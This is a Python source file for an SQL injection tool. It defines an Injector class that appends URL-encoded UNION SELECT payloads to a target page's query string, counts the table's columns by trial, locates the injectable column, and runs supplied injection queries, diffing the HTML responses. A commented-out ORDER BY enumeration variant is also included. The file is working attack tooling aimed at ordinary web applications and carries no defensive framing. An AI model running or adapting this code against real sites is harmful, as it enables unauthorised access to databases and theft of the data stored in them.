#!/usr/bin/python
""" Used for basic union-based SQL injection.

"""
import os, sys
import builder, parser, scanner
import re
from collections import Counter
    
class Injector:
    
    # Pass dict of options as param flags
    def __init__(self, flags):
        """ Receives strings from builder to inject and passes off output to parser.
            :flags:
        """
        self.flags = flags 
        self.offset = 0 # can be changed to say, self.offset, if 1,2,3,4... found on page a lot
        self.columns_upper_limit_guess = 9
        self.parse = parser.Parser('') #hackish
        self.scan = scanner.Scanner()
    
    
    # Try unions until no SQL errors returned.
    # Return number of columns in exposed table.
    # Can test using:
    #   i)  UNION SELECT [1],[1,2],...
    #   ii) ORDER BY [1],[2],...
    #
    def get_num_columns(self, page):
        count = 1
    
        original_page = self.scan.page(page)
        ### Using UNION SELECT appending 1,2,... ###
        union = page + '%20UNION%20SELECT%201'

        ### Heuristic just looks for SELECT or empty list, needs to be MORE NUANCED!

        while len(self.parse.html_diff(original_page, self.scan.page(union))) == 0 or 'SELECT' in self.parse.html_diff(original_page, self.scan.page(union)):
            count += 1
            union += ',%20' + str(count + self.offset)

        """
        ### Using ORDER BY x--, x = 9,8,... ###
        count = self.columns_upper_limit_guess
        order_by = page + self.delimiter + 'ORDER' + self.delimiter + 'BY' + self.delimiter + str(count) + '--'
        while 'Unknown' in self.parse.html_diff(original_page, self.get_page(order_by)) and count > 0:
            count -= 1
            temp = list(order_by)
            temp[-3] = str(count)
            order_by = "".join(temp)
        """
    
        return count
    
    def get_visible_param(self, page):
        """ Get most common number appearing in HTML, this is where to inject variables.
            :page: List of HTML lines.
            :returns: Most commonly seen number in page, hopefully the injectable param.
        """
        
        # Make query string
        union_urls = builder.Builder(page, []).union_nums(self.get_num_columns(page))
        new_url = page.split('=')[0] + '=null' + '%20UNION%20SELECT' + ",".join(union_urls)

        diff = self.parse.html_diff(self.scan.page(page), self.scan.page(new_url))
        nums = [filter(str.isdigit, str(re.sub('<.*>','', line))) for line in diff]
        #nums.remove('')

        return Counter(nums).most_common(1)[0][0]
        
    
    def injection(self, page, queries):
        """ Takes page to fuzz for injections and params to check for.
            :returns: dict of lists, keys are injected strings, values are results.
        """
        default_page = self.scan.page(page)
        data = {}
        
        for query in queries:
            data[query] = self.parse.html_diff(default_page, self.scan.page(queries[query]))

        return data
    
    #
